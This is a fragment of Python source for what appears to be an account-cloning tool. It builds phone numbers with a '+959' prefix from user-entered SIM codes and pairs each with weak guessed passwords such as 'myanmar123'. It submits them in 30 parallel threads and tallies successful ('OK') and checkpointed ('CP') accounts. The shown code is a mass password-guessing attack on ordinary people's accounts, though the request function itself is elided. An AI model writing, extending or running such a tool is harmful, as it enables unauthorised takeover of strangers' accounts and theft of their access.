...
def pass1():
    ...
    print(f"")
    print(f' {GREEN}[!] PAk SIM CODES : {Y}77, 79, 76, 78')
    print(f' {GREEN}[!]               : {T}44, 42, 45, 25')
    print(f' {GREEN}[!]               : {Q}98, 95, 97, 66')
    linex()
    print(f"\x1b[97m[\033[37;41mBEST CODE FOR PAK 77 / 25 / 44 / 66 /88   \033[0;m]")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    print(logo)
...
def Ulti():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = '+959'+code+love
            pwx = [love,code+love,code+love[:2],code+love[:1],code+love[3:],'Myanmar','myanmar','myanmar123','KyawKyaw']
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
